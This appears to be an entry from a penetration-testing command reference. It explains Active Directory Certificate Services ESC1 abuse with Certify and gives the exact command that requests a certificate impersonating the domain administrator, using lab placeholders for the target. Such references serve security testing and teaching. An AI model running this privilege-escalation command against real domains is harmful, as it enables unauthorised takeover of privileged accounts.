---
description: |
  Certify's `request` module can exploit an ESC1-vulnerable certificate template by submitting a certificate signing request that specifies an alternate Subject Alternative Name (SAN) via `/altname`, impersonating a privileged account such as a domain administrator. Because the template permits enrollee-supplied SANs and includes the Client Authentication EKU, the CA issues a valid certificate for the specified identity, which Certify outputs as a base64-encoded PFX that can be converted and used to authenticate as that privileged user.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

  	CA name: test-CA\test-CA

  	Template name: ESC1-Vulnerable

  	Impersonated user: administrator

command: |
  Certify.exe request /ca:test-CA\test-CA /template:ESC1-Vulnerable /altname:administrator
items:
  - Shell
services:
  - ADCS
OS:
  - Windows
phases:
  - PrivEsc
references:
  - https://github.com/GhostPack/Certify
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
---
